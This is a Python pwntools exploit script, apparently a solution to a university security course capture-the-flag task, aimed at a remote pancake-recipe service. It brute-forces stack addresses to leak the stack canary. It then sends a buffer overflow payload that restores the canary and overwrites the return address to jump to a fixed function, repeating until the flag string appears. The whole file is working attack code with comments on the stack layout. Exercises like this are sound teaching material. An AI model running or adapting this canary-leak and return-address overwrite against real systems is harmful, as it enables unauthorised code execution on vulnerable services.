from pwn import *

context.log_level = "debug"

maxAdress = 0x7ffffffff000
minAdress = 0x7fffffffb000
for i in range (maxAdress,minAdress , -0x4):
    io = remote('inf226.puffling.no', 7003)

    

    try:
        io.recvuntil(b'What is your favourite pancake recipe? (Finish with an empty line)\n1. ') # Get the first string out of the output

        io.sendline(cyclic(32) + p64(i))

        maybeCanary = io.recvuntil(b'. ').decode().split('.')[0]
        canary = p64(int(maybeCanary, 16))

        io.sendline(cyclic(32) + p64(i) + canary + cyclic(8) + p64(0x4011db))
        # Send 32 bytes so fill buffer, then the adress of the canary to fill linepointer
        # Then send the canary value to not be detected of stack smashing
        # Padding of 8 to skip rbp and override rip
        
        io.sendline() # Exits the while loop
       
        output = str(io.readall(timeout=.5))
        print(output)
        if 'INF226{' in output:
            print(i)
            io.close()
            break

        io.close()


    except Exception as e:
        print(e)
        io.close()
        

    

